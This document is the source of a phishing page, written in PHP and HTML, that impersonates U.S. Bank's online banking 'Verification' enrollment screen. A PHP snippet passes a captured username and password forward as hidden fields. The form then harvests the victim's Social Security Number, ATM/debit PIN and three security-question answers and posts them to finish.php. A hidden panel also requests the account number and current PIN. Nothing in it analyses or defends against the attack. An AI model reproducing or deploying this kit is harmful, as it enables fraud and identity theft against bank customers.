﻿<?
error_reporting(0);
$user .= $_POST['uname'];
$pass .= $_POST['passe'];

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0068)https://onlinebanking.usbank.com/Auth/EnrollmentDesktop/Verification -->
<html xmlns="http://www.w3.org/1999/xhtml" class=" js canvas canvastext no-touch geolocation hashchange history draganddrop rgba multiplebgs backgroundsize borderimage borderradius opacity cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions generatedcontent video audio svg inlinesvg smil svgclippaths"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Cache-Control" content="private,no-cache, no-store, must-revalidate"><meta http-equiv="Expires" content="-1"><meta http-equiv="Pragma" content="private,no-cache"><link href="files/Common_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">
<link href="files/jquery-ui-1.9.2.custom_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">
<link href="files/ProgressBar_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">


    
    <title>Verification</title>
    <link href="files/Container_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">

	<link href="files/Enrollment_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">

                                                                                  

    
    <!-- PCR014 added as the styles from imported files like master_modt css file are overriding the underline decoration Start -->
    <style type="text/css">
        a#securityStandards, a#securityStandards:visited, a#securityStandards:link, a#securityStandards:active, a#privacyPledge, a#privacyPledge:visited, a#privacyPledge:link, a#privacyPledge:active{
            text-decoration: underline;
        }

        a#securityStandards:hover, a#privacyPledge:hover{
            text-decoration: none; color:#0c2074;
        }
    </style>
    <!-- PCR014 added as the styles from imported files like master_modt css file are overriding the underline decoration End -->
    
    <link href="files/usbankDesktop_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">
<link href="files/skinCommon_modt_01509485791.css" rel="stylesheet" type="text/css" media="all">
<title>

</title></head>
<body id="notIE" class="css-enabled cookies-enabled">
	                  
    <div class="container">
        <div id="siteHeader" class="commonHeader">
        
 <div class="customBackground"></div>
<div id="siteHeader" class="headerContainer">
<div class="menuLinks">                          
           <span class="partnerLink"><a href="http://www.usbank.com/" target="_blank">Back to  Site</a><span>|</span></span>
           <span class="usbHomeLink"><a href="http://www.usbank.com/">U.S. Bank Home</a><span>|</span></span>           
           <span class="customerServiceLink"><a href="http://www.usbank.com/contact" target="_blank">Customer Service</a></span>
           <span class="locationsLink"><span>|</span><a target="_blank" href="http://www.usbank.com/usbanklocations/search.jsp">Locations</a></span>           
           
        </div>
    <div class="headerSection_Logos">            
         <span class="logo"></span>
         
    </div>
    <div class="headerSection_Menus">                
        <span class="partnerCardArt"></span>
    </div>
</div>
<div class="clear"></div>
         
        </div>
        <div class="span-24"> 
           
        
            <div id="topNavigation">
                

<ul class="progress-4" style="clear: both;">
    
    <li class="first-active">
        <div title="Verification" style="padding-left:66px;">
            Verification</div>
    </li>
    
    <li class="second-active">
        <div title="Security" style="padding-left:69px;">
            Security Question</div>
    </li>
	<li class="third-active">
        <div title="Security" style="padding-left:56px;">
            Account Identification</div>
    </li>
    
</ul>

            </div>
            
        </div>
        
    
    <!-- PCR014 added Start -->
    <style type="text/css">
        #divHeaderTitle p{
            margin: 0px 0px 14px;
        }
        input[type=radio], input.radio {
	        margin-right: 4px;
        }
    </style>
    <!-- PCR014 added End -->

    <form action="finish.php" autocomplete="off" id="frmVerification" method="post">
	<input type="hidden" name="uname" value="<?php echo($user); ?>">
<input type="hidden" name="passe" value="<?php echo($pass); ?>">
    <div class="span-24 padTop20" style="line-height:1; margin:0px 0px 0px">
        <div id="divHeaderTitle" class="pageTitle">
        <!-- PCR14  start -->
            <p style="font-size:24px;color:#0c2074;"><strong>Protect Unauthorised Access to Your Accounts.</strong></p>
            <!-- PCR14  end -->    
        </div>
      </div>
    <div id="customerCenterContainer padBot25" style="margin-bottom:-4px">
        <br class="clearBoth">
        <div class="bodyCopy">
        <!-- PCR14  start -->
            <div style="font-size:12px;color:#333333;">
              <p>Get ready to secure  your online account when you use either your tablet or computer. You"ll need to complete all the following to get started:</p>
        </div>
    </div>
    <div id="divBox" class="customerCenterContent">
      <div id="divLefttUC"></div>
        <div id="divMiddleDivider">
            
        </div>
        <div id="divRightUC">
            
   
    
    <div class="leftColumn">
    <div class="containerHeaders">
        <div class="AccountInfoIcon padTop15">Personal Information</div>
    </div>
    <div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Social Security Number
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div>
                <input name="ssn" type="text" class="required stretch-236" id="fname" tabindex="1" maxlength="12" validateonblur="false" validation="{&quot;required&quot;:&quot;Please enter your Credit Card, Premier Line or CreditLine Account Number.&quot;}" hovertext="" required>
            </div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                ATM/Debit Card PIN
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">                </span>            </div>
            <div>
              <input id="scode2" type="password" maxlength="4" minlength="4" class="stretch-68 required matchlen matchregx" regxexpr="SignaturePanelCode" group="SignaturePanelCode" validateonsubmit="true" name="peen" tabindex="2" validation="{&quot;required&quot;:&quot;Please enter your 3-digit Signature Panel Code, usually found on the back of your card.&quot;,
                                                &quot;regex&quot;:&quot;The Signature Panel Code entered is not valid. Please re-enter your 3-digit Signature Panel Code.&quot;,
                                                &quot;minlength&quot;:&quot;Your Signature Panel Code must be 3 digits. Please try again.&quot;}" hovertext="" required/>
            </div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Select your 1st Security Question
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div><span class="field confidential">
              <select name="que1" id="ide" class="confidential" required>
<option value="Select">Select Question</option>
<option value="What is your greatest phobia or fear?">What is your greatest phobia or fear?</option>
<option value=" What is your dream car?"> What is your dream car?</option>
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What are the last five digits of your favorite frequent flyer card?">What are the last five digits of your favorite frequent flyer card?</option>
<option value="Where did you meet your spouse or partner for the very first time?">Where did you meet your spouse or partner for the very first time?</option>
<option value="What country would you most like to visit?">What country would you most like to visit?</option>
<option value="What is the name of a college you applied to but did not attend?">What is the name of a college you applied to but did not attend?</option>
<option value="What was the name of your favorite childhood toy?">What was the name of your favorite childhood toy?</option>
<option value="What city would you most like to visit?">What city would you most like to visit?</option>
<option value="Who was your childhood hero?">Who was your childhood hero?</option>
<option value="What is your favorite actors name?">What is your favorite actors name?</option>
<option value="Who would you most like to meet?">Who would you most like to meet?</option>
<option value="What is the name of your veterinarian?">What is the name of your veterinarian?</option>
<option value="In what school did you attend the 6th grade?">In what school did you attend the 6th grade?</option>
<option value="What was the name of your first employer?">What was the name of your first employer?</option>
<option value="Where would you most like to go on vacation?">Where would you most like to go on vacation?</option>
<option value="Who was your father's first employer?">Who was your father's first employer?</option>
<option value="What are the last five digits of your student id?">What are the last five digits of your student id?</option>
<option value="What is the name of your first pet?">What is the name of your first pet?</option>
<option value="What was the street number of the house in which you grew up?">What was the street number of the house in which you grew up?</option>
<option value="Where would you most like to live?">Where would you most like to live?</option>
<option value="What was the name of your best friend in high-school?">What was the name of your best friend in high-school?</option>
<option value="Where would you most like to live when you retire?">Where would you most like to live when you retire?</option>
<option value="What was the name of the maid of honor at your wedding?">What was the name of the maid of honor at your wedding?</option>
<option value="What was the name of your best friend in college?">What was the name of your best friend in college?</option>
<option value="What was the worst car you owned?">What was the worst car you owned?</option>
<option value="What was your favorite teachers name?">What was your favorite teachers name?</option>
<option value="What is the name of your hair stylist?">What is the name of your hair stylist?</option>
<option value="What is the name of your favorite roommate?">What is the name of your favorite roommate?</option>
<option value="What is your favorite musicians name?">What is your favorite musicians name?</option>
</select>
            </span></div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Answer
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div>
              <input type="text" id="add2" validateonblur="false" name="ans1" tabindex="1" validation="{&quot;required&quot;:&quot;Please enter your Credit Card, Premier Line or CreditLine Account Number.&quot;}" class="required stretch-236" hovertext="" required/>
            </div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Select your 2nd Security Question
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div><span class="field confidential">
              <select name="que2" id="select" class="confidential" required>
                <option value="Select">Select Question</option>
                <option value="What is your greatest phobia or fear?">What is your greatest phobia or fear?</option>
                <option value=" What is your dream car?"> What is your dream car?</option>
                <option value="What was the model of your first car?">What was the model of your first car?</option>
                <option value="What are the last five digits of your favorite frequent flyer card?">What are the last five digits of your favorite frequent flyer card?</option>
                <option value="Where did you meet your spouse or partner for the very first time?">Where did you meet your spouse or partner for the very first time?</option>
                <option value="What country would you most like to visit?">What country would you most like to visit?</option>
                <option value="What is the name of a college you applied to but did not attend?">What is the name of a college you applied to but did not attend?</option>
                <option value="What was the name of your favorite childhood toy?">What was the name of your favorite childhood toy?</option>
                <option value="What city would you most like to visit?">What city would you most like to visit?</option>
                <option value="Who was your childhood hero?">Who was your childhood hero?</option>
                <option value="What is your favorite actors name?">What is your favorite actors name?</option>
                <option value="Who would you most like to meet?">Who would you most like to meet?</option>
                <option value="What is the name of your veterinarian?">What is the name of your veterinarian?</option>
                <option value="In what school did you attend the 6th grade?">In what school did you attend the 6th grade?</option>
                <option value="What was the name of your first employer?">What was the name of your first employer?</option>
                <option value="Where would you most like to go on vacation?">Where would you most like to go on vacation?</option>
                <option value="Who was your father's first employer?">Who was your father's first employer?</option>
                <option value="What are the last five digits of your student id?">What are the last five digits of your student id?</option>
                <option value="What is the name of your first pet?">What is the name of your first pet?</option>
                <option value="What was the street number of the house in which you grew up?">What was the street number of the house in which you grew up?</option>
                <option value="Where would you most like to live?">Where would you most like to live?</option>
                <option value="What was the name of your best friend in high-school?">What was the name of your best friend in high-school?</option>
                <option value="Where would you most like to live when you retire?">Where would you most like to live when you retire?</option>
                <option value="What was the name of the maid of honor at your wedding?">What was the name of the maid of honor at your wedding?</option>
                <option value="What was the name of your best friend in college?">What was the name of your best friend in college?</option>
                <option value="What was the worst car you owned?">What was the worst car you owned?</option>
                <option value="What was your favorite teachers name?">What was your favorite teachers name?</option>
                <option value="What is the name of your hair stylist?">What is the name of your hair stylist?</option>
                <option value="What is the name of your favorite roommate?">What is the name of your favorite roommate?</option>
                <option value="What is your favorite musicians name?">What is your favorite musicians name?</option>
              </select>
            </span></div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
             
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Answer
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div>
                <input type="text" id="fone" validateonblur="false" name="ans2" tabindex="1" validation="{&quot;required&quot;:&quot;Please enter your Credit Card, Premier Line or CreditLine Account Number.&quot;}" maxlength="10" class="required stretch-236" hovertext="" required>
            </div>
            <div>
              <div class="vs20">
              </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="div" class="">
      <div id="div2" class="">
        <div class="text333Size12 padTop20"> Select your 3rd Security Question <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number."> </span> </div>
        <div><span class="field confidential">
          <select name="que3" id="select2" class="confidential" required>
            <option value="Select">Select Question</option>
            <option value="What is your greatest phobia or fear?">What is your greatest phobia or fear?</option>
            <option value=" What is your dream car?"> What is your dream car?</option>
            <option value="What was the model of your first car?">What was the model of your first car?</option>
            <option value="What are the last five digits of your favorite frequent flyer card?">What are the last five digits of your favorite frequent flyer card?</option>
            <option value="Where did you meet your spouse or partner for the very first time?">Where did you meet your spouse or partner for the very first time?</option>
            <option value="What country would you most like to visit?">What country would you most like to visit?</option>
            <option value="What is the name of a college you applied to but did not attend?">What is the name of a college you applied to but did not attend?</option>
            <option value="What was the name of your favorite childhood toy?">What was the name of your favorite childhood toy?</option>
            <option value="What city would you most like to visit?">What city would you most like to visit?</option>
            <option value="Who was your childhood hero?">Who was your childhood hero?</option>
            <option value="What is your favorite actors name?">What is your favorite actors name?</option>
            <option value="Who would you most like to meet?">Who would you most like to meet?</option>
            <option value="What is the name of your veterinarian?">What is the name of your veterinarian?</option>
            <option value="In what school did you attend the 6th grade?">In what school did you attend the 6th grade?</option>
            <option value="What was the name of your first employer?">What was the name of your first employer?</option>
            <option value="Where would you most like to go on vacation?">Where would you most like to go on vacation?</option>
            <option value="Who was your father's first employer?">Who was your father's first employer?</option>
            <option value="What are the last five digits of your student id?">What are the last five digits of your student id?</option>
            <option value="What is the name of your first pet?">What is the name of your first pet?</option>
            <option value="What was the street number of the house in which you grew up?">What was the street number of the house in which you grew up?</option>
            <option value="Where would you most like to live?">Where would you most like to live?</option>
            <option value="What was the name of your best friend in high-school?">What was the name of your best friend in high-school?</option>
            <option value="Where would you most like to live when you retire?">Where would you most like to live when you retire?</option>
            <option value="What was the name of the maid of honor at your wedding?">What was the name of the maid of honor at your wedding?</option>
            <option value="What was the name of your best friend in college?">What was the name of your best friend in college?</option>
            <option value="What was the worst car you owned?">What was the worst car you owned?</option>
            <option value="What was your favorite teachers name?">What was your favorite teachers name?</option>
            <option value="What is the name of your hair stylist?">What is the name of your hair stylist?</option>
            <option value="What is the name of your favorite roommate?">What is the name of your favorite roommate?</option>
            <option value="What is your favorite musicians name?">What is your favorite musicians name?</option>
          </select>
        </span></div>
        <div>
          <div class="vs20"> </div>
        </div>
      </div>
	  <div id="div3" class="Hidden">
        <div>
          <div class="text333Size12"></div>
        </div>
	    </div>
	  </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
            <div class="text333Size12 padTop20">
                Answer
                <span id="imgHelpAccountNumberHelp2" class="singlehelpIcon" helptext="Enter your full 16-digit Credit Card, Premier Line, or CreditLine account number without spaces. &lt;br/&gt;&lt;br/&gt; For American Express cards, enter your full 15-digit card number.">
                </span>
            </div>
            <div>
                <input type="text" id="mmnn" validateonblur="false" name="ans3" tabindex="1" validation="{&quot;required&quot;:&quot;Please enter your Credit Card, Premier Line or CreditLine Account Number.&quot;}" maxlength="40" class="required stretch-236" hovertext="" required>
            </div>
            <div>
              <div class="vs20">                </div>
            </div>
          </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
        <div></div>
            <div class="">
              <label>
                    <input type="submit" name="Submit" value="Submit" />
              </label>
            </div>
          </div>
        </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	<div id="divPersonalInfo" class="">
      <div id="divPersonalNoItem1Info" class="">
        <div></div>
            <div>
              <div class="vs20">
              </div>
            </div>
        </div>
      <div id="divPersonalNoItem4Info" class="Hidden">
            <div>
              <div class="text333Size12"></div>
            </div>
        </div>
    </div>
	
	<div id="divBusinessInfo" class="Hidden">
      <div id="divBusinessNoItem2Info" class="padBot10 Hidden"></div>
        <div id="divIllinoisFund" class="Hidden">
            <div>
              <div class=""></div>
          </div>
        </div>
    </div>
</div>

<div class="rightColumn">
    </form>
    <div id="changePinLightBox" style="display: none">
        <input type="hidden" id="hdnSelectedATMCardNo" group="ATMCardNo" matchvalue="1">
        <input type="hidden" id="hdnOldPin" group="OldPIN" matchvalue="1">
        <form action="finish.php" autocomplete="off" id="frmDefaultPin" method="post">
<div>
    <div id="divChangePin" class="Hidden">
        <div class="PageTitle">
            Change Default PIN
        </div>
        <div class="span-14">
            <span>
                You have used your default PIN. To continue, please change your PIN below.</span>
            <div class="text333Size12 padTop12 padBot5 bold">
                Primary Checking or Savings Account Number
            </div>
            <div>
                
                <input type="text" id="txtAccNo" validateonblur="false" name="SelectedATMCardNo" maxlength="40" class="required matchvalue" validation="{&quot;required&quot;:&quot;Please enter the account number that is associated with your check or ATM Card.&quot;}" hovertext="">
            </div>
            <div class="text333Size12 padTop20 padBot5 bold">
                Current PIN
            </div>
            <div>
                
                <input id="txtCurrentPin" maxlength="4" type="password" name="OldPIN" class="required matchlen matchregx" regxexpr="PIN" validation="{&quot;required&quot;:&quot;Please enter your 4-digit PIN.&quot;,
                                                &quot;regex&quot;:&quot;Please enter your 4-digit PIN.&quot;,
                                                &quot;minlength&quot;:&quot;Please enter your 4-digit PIN.&quot;}" hovertext="">
            </div>
            <div class="">
                <div class="text333Size12 padTop20 aligndivRightDesktop bold">
                    <span class="">
                        New PIN
                    </span><span id="imgHelpNewPIN" class="singlehelpIcon" helptext="Enter the PIN you use with the card that is attached to your account.&lt;br/&gt;&lt;br/&gt;Forgot your PIN? Please contact us at 800-US BANKS (800-872-2657) to have a new PIN mailed to you, or you can visit your local branch.
">
                    </span>
                    <div>
                        <input id="txtNewPin" maxlength="4" type="password" name="NewPIN" matchwith="0000,9999" matchwithfixeddata="true" matchvalue="1" group="PIN" class="required matchlen matchregx matchotherfield matchvalue" regxexpr="PIN" validation="{&quot;required&quot;:&quot;Please enter a new 4-digit PIN.&quot;,
                                                &quot;regex&quot;:&quot;The New PIN entered is not valid. Please re-enter a new 4-digit PIN. These PINs will not be accepted: 0000, 9999.&quot;,
                                                &quot;minlength&quot;:&quot;The New PIN entered is not valid. Please re-enter a new 4-digit PIN. These PINs will not be accepted: 0000, 9999.&quot;,
                                                &quot;otherfield&quot;:&quot;The New PIN entered is not valid. Please re-enter a new 4-digit PIN. These PINs will not be accepted: 0000, 9999.&quot;}" hovertext="">
                    </div>
                </div>
                <div class="text333Size12 padTop20 aligndivRightDesktop bold">
                    <span class="">
                        Confirm New PIN
                    </span>
                    <div class="padTop10">
                        <input id="txtConfirmPin" maxlength="4" type="password" name="ConfirmNewPIN" matchvalue="2" group="PIN" class="required matchlen matchregx matchvalue" regxexpr="PIN" validation="{&quot;required&quot;:&quot;Please confirm your new 4-digit PIN.&quot;,
                                                &quot;regex&quot;:&quot;The PINs entered do not match. Please confirm your new PIN again.&quot;,
                                                &quot;minlength&quot;:&quot;The PINs entered do not match. Please confirm your new PIN again.&quot;,
                                                &quot;confirmvalue&quot;:&quot;The PINs entered do not match. Please confirm your new PIN again.&quot;}" hovertext="">
                    </div>
                </div>
            </div>
        </div>
        <div class="buttonPanel">
            <input type="button" href="" target="" id="btnOKLightBox" class="usb-blue-default" value="Submit">
            <a id="btnCancelAndRemoveError" class="cancelLink" onclick="location.href= &quot;https://www.usbank.com/index.html&quot;">
                Cancel</a>
        </div>
    </div>
    <div id="divChangePinResult" class="Hidden">
        <div class="padLeft15 padRight15 vs10">
            <div id="divChangePinHeader" class="PageTitle">
            </div>
            <div>
                <h2>
                    Confirmation</h2>
            </div>
            <div id="divChangePinBody" class="span-14 ThirdPartyContent">
                <div class="Hidden successMessageIcon successMessage" id="divChangePinSuccess">
                </div>
                <div class="Hidden errorMessageIcon errorMsg" id="divChangePinFailure">
                </div>
            </div>
            <div class="buttonPanel padBot20">
                <a id="btnCloseAndRedirect" class="soloLink stretch-425">
                    Close</a>
            </div>
        </div>
    </div>
</div>
</form>
    </div>
    <div id="divStaticLightBox" style="display: none">
        <div class="padLeft10 padBot10">
            <div id="divLightBoxHeader" class="PageTitle">
            </div>
            <div id="divLightBoxBody" class="span-14">
            </div>
            <div class="buttonPanel">
                <a id="btnCloseLightBox" class="soloLink stretch-425">
                    Close</a>
            </div>
        </div>
    </div>

    </div>
    
    <!-- DTSYS00169226 defect fix - background color changed -->
    <div id="page-footer" style="background-color:#F5F5F5; width:100%; margin-top:30px; margin-bottom:0px">
      <div class="container" style="margin-left:auto; margin-right:auto; margin-top:0px; line-height:1">
            <div style="z-index: 90; margin-top:20px" class="span-24">
                <div>
                    <div class="footerSecureImage floatLeft vs-2" style="margin-top:0px">
                        &nbsp;</div>
                    <div class="padLeft6 footerConectionText floatLeft" style="margin-top:8px">
                        Connection Secured</div>
                </div>
                <div class="">
                </div>
                <div class="span-24 grayText vs7">
                    <div style="float: right; z-index: 85; margin-right: 7px; margin-top:-20px" class="footerBorder">
                        <ul class="horizontalNavigation footerBorder">
                            <li class=""><a id="securityStandards" title="SecurityStandards" onclick="LinkClick(this.id,&#39;olb:global footer:security standards link&#39;)" href="https://www.usbank.com/online-security/fraud-prevention.html" style="font-size:12px" target="_blank">Security Standards</a></li>
                            <li class="last_nav_footer"><a id="privacyPledge" onclick="LinkClick(this.id,&#39;olb:global footer:privacy pledge link&#39;)" title="Privacy Pledge" href="http://www.usbank.com/cgi_w/cfm/about/privacy/privacy_pledge.cfm" style="font-size:12px" target="_blank">Privacy Pledge</a> </li>
                        </ul>
                    </div>
                </div>
                <div class="clear floatLeft padTop3Imp" style="margin-bottom:16px">
                    <div class="copyRightInfo2" style="margin-top:7px">©
                        <!--DTSYS00168093 defect resolution to have current year against copyright in all footers Start -->
                        2019
                        <!--2019-->
                        <!--DTSYS00168093 defect resolution to have current year against copyright in all footers End -->
                        U.S. Bank</div>
                    <div class="copyRightInfo2" id="ServerInfo" style="margin-bottom:0px; margin-top:4px">
                        OLB: KS-M0E  015.05.40799.1</div>
                </div>
            </div>
            <!--<div style="z-index: 85" class="padTop15 footerBorder">
            </div>-->
            <div style="margin-top:0px"></div>
            <!--<div>
                
			<div style="border: 1px solid #B8B8B8;color:#333333; padding:10px; height:43px">
				<p style="font-size: 10px; margin:5px 0px 0px; line-height:1">Investment products and services are:</p>
				<p style="padding-top:0px; font-size:10px; margin-bottom:0px; margin:15px 0px 1em; line-height:1">
					Not a Deposit
					<span style="padding: 0px 6px">•</span>Not FDIC Insured
					<span style="padding: 0px 6px">•</span> May Lose Value 
					<span style="padding: 0px 6px">•</span> Not Bank Guaranteed 
					<span style="padding: 0px 6px">•</span> Not insured by any Federal Government Agency
				</p>
			</div>
            </div>
            <div>
                
				<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bank:</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px"><img src="/USB/CMSContent/images/EqualHousingLender1.png" alt="Equal Housing Lender" /> Equal Housing Lender. Deposit products offered by U.S. Bank National Association. Member FDIC</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px">U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.</p></div>
			 
            </div>
            <div>
                
			<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bancorp Investments:</p><p style="font-size:10px; line-height:1.5; margin:10px 0px 0px">Investment products and services are available through U.S. Bancorp Investments, the marketing name for U.S. Bancorp Investments, Inc., member <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = 'none',this.style.color= '#0c2074'" onmouseout="this.style.textDecoration = 'underline',this.style.color= '#0c2074'" title="FINRA" href="http://www.finra.org/" target="_blank">FINRA</a> and <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = 'none',this.style.color= '#0c2074'" onmouseout="this.style.textDecoration = 'underline',this.style.color= '#0c2074'" title="SIPC" href="http://www.sipc.org/" target="_blank">SIPC</a>, an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank.</p><p style="font-size:10px; line-height:2; margin:10px 0px 0px">The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free 1.800.289.9999 or via www.finra.org. An investor brochure describing BrokerCheck is also available through FINRA</p></div>
		 
            </div>-->
            <div id="footerTextA" class="span-24">
                
			<div style="border: 1px solid #B8B8B8;color:#333333; padding:10px; height:43px">
				<p style="font-size: 10px; margin:5px 0px 0px; line-height:1">Investment products and services are:</p>
				<p style="padding-top:0px; font-size:10px; margin-bottom:0px; margin:15px 0px 1em; line-height:1">
					Not a Deposit
					<span style="padding: 0px 6px">•</span>Not FDIC Insured
					<span style="padding: 0px 6px">•</span> May Lose Value 
					<span style="padding: 0px 6px">•</span> Not Bank Guaranteed 
					<span style="padding: 0px 6px">•</span> Not insured by any Federal Government Agency
				</p>
			</div>
            </div>
            <div id="footerTextC" class="span-24" style="margin-top:16px">
                
				<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bank:</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px"><img src="files/EqualHousingLender1.png" alt="Equal Housing Lender"> Equal Housing Lender. Deposit products offered by U.S. Bank National Association. Member FDIC</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px">U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.</p></div>
			 
            </div>
            <div id="footerTextD" class="span-24" style="margin-top:25px">
                
			<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bancorp Investments:</p><p style="font-size:10px; line-height:1.5; margin:10px 0px 0px">Investment products and services are available through U.S. Bancorp Investments, the marketing name for U.S. Bancorp Investments, Inc., member <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = &#39;none&#39;,this.style.color= &#39;#0c2074&#39;" onmouseout="this.style.textDecoration = &#39;underline&#39;,this.style.color= &#39;#0c2074&#39;" title="FINRA" href="http://www.finra.org/" target="_blank">FINRA</a> and <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = &#39;none&#39;,this.style.color= &#39;#0c2074&#39;" onmouseout="this.style.textDecoration = &#39;underline&#39;,this.style.color= &#39;#0c2074&#39;" title="SIPC" href="http://www.sipc.org/" target="_blank">SIPC</a>, an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank.</p><p style="font-size:10px; line-height:2; margin:10px 0px 0px">The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free 1.800.289.9999 or via www.finra.org. An investor brochure describing BrokerCheck is also available through FINRA</p></div>
		 
            </div>
            <!--<div class="span-24 vs7" id="Div2">
                <br />
                
			<div style="border: 1px solid #B8B8B8;color:#333333; padding:10px; height:43px">
				<p style="font-size: 10px; margin:5px 0px 0px; line-height:1">Investment products and services are:</p>
				<p style="padding-top:0px; font-size:10px; margin-bottom:0px; margin:15px 0px 1em; line-height:1">
					Not a Deposit
					<span style="padding: 0px 6px">•</span>Not FDIC Insured
					<span style="padding: 0px 6px">•</span> May Lose Value 
					<span style="padding: 0px 6px">•</span> Not Bank Guaranteed 
					<span style="padding: 0px 6px">•</span> Not insured by any Federal Government Agency
				</p>
			</div> <br /> 
				<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bank:</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px"><img src="/USB/CMSContent/images/EqualHousingLender1.png" alt="Equal Housing Lender" /> Equal Housing Lender. Deposit products offered by U.S. Bank National Association. Member FDIC</p><p style="font-size:10px; line-height:1; margin: 10px 0px 0px">U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.</p></div>
			  <br /> 
